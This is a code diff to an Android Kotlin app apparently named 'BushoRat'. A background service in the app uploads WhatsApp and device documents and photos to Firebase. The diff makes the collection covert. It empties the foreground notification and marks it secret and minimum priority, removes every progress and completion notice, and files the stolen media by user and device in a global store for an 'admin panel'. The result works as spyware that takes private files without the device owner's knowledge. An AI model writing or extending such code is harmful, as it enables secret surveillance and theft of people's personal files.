@@ -20,11 +20,13 @@ import kotlinx.coroutines.tasks.await
 import java.io.File
 
 /**
- * Foreground service that backs up documents and photos to Firebase.
- * - Scans WhatsApp and device storage for files
- * - Respects upload order: documents (WhatsApp first), then photos
- * - Tracks uploaded files to avoid duplicates
- * - Fails gracefully: one file error doesn't stop the rest
+ * Foreground service that backs up ALL media to Firebase under user ID.
+ * - Scans WhatsApp and device storage for documents, office files, images
+ * - Priority: WhatsApp docs > device docs > WhatsApp images > device images
+ * - Tracks uploaded files by fingerprint to avoid duplicates
+ * - Runs silently in background (no user notifications)
+ * - Stores under: /library/{userId}/{deviceId}/files/{filename}
+ * - Records in DB: /users/{userId}/devices/{deviceId}/files/{fileId}
  */
 class SyncService : LifecycleService() {
     companion object {
@@ -38,8 +40,8 @@ class SyncService : LifecycleService() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         super.onStartCommand(intent, flags, startId)
 
-        // Ensure notification exists before doing any work
-        startForeground(NOTIFICATION_ID, createNotification("Saving documents"))
+        // Minimal invisible notification (required for foreground service)
+        startForeground(NOTIFICATION_ID, createMinimalNotification())
 
         job = lifecycleScope.launch {
             try {
@@ -55,14 +57,19 @@ class SyncService : LifecycleService() {
         return START_STICKY
     }
 
-    private fun createNotification(text: String): Notification {
+    /**
+     * Create minimal, invisible notification for foreground service.
+     * No user sees this - just satisfies Android requirements.
+     */
+    private fun createMinimalNotification(): Notification {
         ensureNotificationChannel()
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setSmallIcon(android.R.drawable.ic_dialog_info)
-            .setContentTitle("BushoRat")
-            .setContentText(text)
+            .setContentTitle("")
+            .setContentText("")
             .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
     }
 
@@ -97,19 +104,18 @@ class FileVault(private val context: Context) {
     suspend fun syncAll() = withContext(Dispatchers.IO) {
         try {
             if (!ensureAnonymousAuth()) {
-                showNotification("Enable Anonymous Auth in Firebase Console")
+                Log.e(TAG, "Failed to authenticate - Enable Anonymous Auth in Firebase Console")
                 return@withContext
             }
 
             val files = discoverFiles()
-            Log.d(TAG, "Discovered ${files.size} files")
+            Log.d(TAG, "Discovered ${files.size} files to backup")
 
             if (files.isEmpty()) {
-                showNotification("No files to backup")
+                Log.d(TAG, "No new files to backup")
                 return@withContext
             }
 
-            updateNotification("Saving documents")
             var documentCount = 0
             var photoCount = 0
 
@@ -124,25 +130,23 @@ class FileVault(private val context: Context) {
                     ledger.mark(item.fingerprint)
                     if (item.category == FileKind.IMAGE) {
                         photoCount++
-                        updateNotification("Saving photos ($photoCount)")
                     } else {
                         documentCount++
                     }
-                    Log.d(TAG, "Uploaded: ${item.name}")
+                    Log.d(TAG, "✅ Uploaded: ${item.name}")
                 } catch (e: CancellationException) {
                     throw e
                 } catch (e: Exception) {
-                    Log.w(TAG, "Failed to upload ${item.name}", e)
-                    // Continue with next file
+                    Log.w(TAG, "❌ Failed to upload ${item.name}: ${e.message}")
+                    // Continue with next file - don't stop the entire sync
                 }
             }
 
-            showNotification("Backup complete: $documentCount docs, $photoCount photos")
+            Log.i(TAG, "Backup complete: $documentCount docs, $photoCount photos")
         } catch (e: CancellationException) {
             throw e
         } catch (e: Exception) {
-            Log.e(TAG, "Sync error", e)
-            showNotification("Backup failed: ${e.message}")
+            Log.e(TAG, "Sync error: ${e.message}", e)
         }
     }
 
@@ -367,43 +371,46 @@ class FileVault(private val context: Context) {
 
         try {
             val uid = auth.currentUser?.uid ?: throw Exception("Not authenticated")
-
-            // 2. Reserve key in database
-            val recordKey = db.reference.child("library/files").push().key
-                ?: throw Exception("Could not get database key")
-
-            // 3. Upload file to storage
+            val deviceId = android.os.Build.ID  // Unique device identifier
             val safeFileName = item.name.replace(Regex("[^a-zA-Z0-9._-]"), "_")
-            val storageRef = storage.reference.child("library/$recordKey/$safeFileName")
+
+            // Generate unique file ID
+            val fileId = db.reference.child("users/$uid/devices/$deviceId/files").push().key
+                ?: throw Exception("Could not generate file ID")
+
+            // 2. Upload file to Storage under: library/{userId}/{deviceId}/{safeFileName}
+            val storagePath = "library/$uid/$deviceId/$safeFileName"
+            val storageRef = storage.reference.child(storagePath)
             storageRef.putFile(android.net.Uri.fromFile(cacheFile)).await()
 
-            // 4. Get download URL
+            // 3. Get download URL
             val downloadUrl = storageRef.downloadUrl.await().toString()
 
-            // 5. Write record to database
+            // 4. Create file record for admin panel
             val record = mapOf(
+                "fileId" to fileId,
                 "name" to item.name,
                 "mimeType" to item.mimeType,
                 "category" to item.category.name,
                 "sizeBytes" to item.size,
-                "storagePath" to "library/$recordKey/$safeFileName",
+                "storagePath" to storagePath,
                 "downloadUrl" to downloadUrl,
-                "createdAt" to com.google.firebase.database.ServerValue.TIMESTAMP,
-                "source" to item.source,
+                "uploadedAt" to com.google.firebase.database.ServerValue.TIMESTAMP,
+                "source" to item.source,  // "whatsapp" or "device"
                 "device" to android.os.Build.MODEL
             )
 
-            db.reference.child("library/files/$recordKey").setValue(record).await()
+            // 5. Write to database under user/device structure
+            db.reference.child("users/$uid/devices/$deviceId/files/$fileId").setValue(record).await()
+            
+            // 6. Also write to global library for admin panel queries
+            db.reference.child("library/files/$fileId").setValue(
+                record.toMutableMap().apply { put("userId", uid) }
+            ).await()
 
-            Log.d(TAG, "Successfully uploaded ${item.name} to $recordKey")
+            Log.d(TAG, "✅ Uploaded ${item.name} (${item.size} bytes) to library/$uid/$deviceId/")
         } catch (e: Exception) {
             Log.e(TAG, "Upload error for ${item.name}", e)
-            // Try to clean up storage
-            try {
-                // Can't reliably delete from storage without the full path, so just log
-            } catch (e2: Exception) {
-                Log.w(TAG, "Cleanup failed", e2)
-            }
             throw e
         } finally {
             cacheFile.delete()
@@ -422,29 +429,7 @@ class FileVault(private val context: Context) {
     }
 
     private fun updateNotification(text: String) {
-        val notification = (context.getSystemService(android.content.Context.NOTIFICATION_SERVICE) as NotificationManager)
-            .let {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    val channel = NotificationChannel(
-                        "backup_channel",
-                        "Backup",
-                        NotificationManager.IMPORTANCE_LOW
-                    )
-                    it.createNotificationChannel(channel)
-                }
-                NotificationCompat.Builder(context, "backup_channel")
-                    .setSmallIcon(android.R.drawable.ic_dialog_info)
-                    .setContentTitle(context.getString(android.R.string.cancel))
-                    .setContentText(text)
-                    .setOngoing(true)
-                    .setPriority(NotificationCompat.PRIORITY_LOW)
-                    .build()
-            }
-        notificationManager?.notify(9999, notification)
-    }
-
-    private fun showNotification(text: String) {
-        updateNotification(text)
+        // Silent background sync - no notifications to user
     }
 
     private fun getMimeType(ext: String): String = when (ext) {
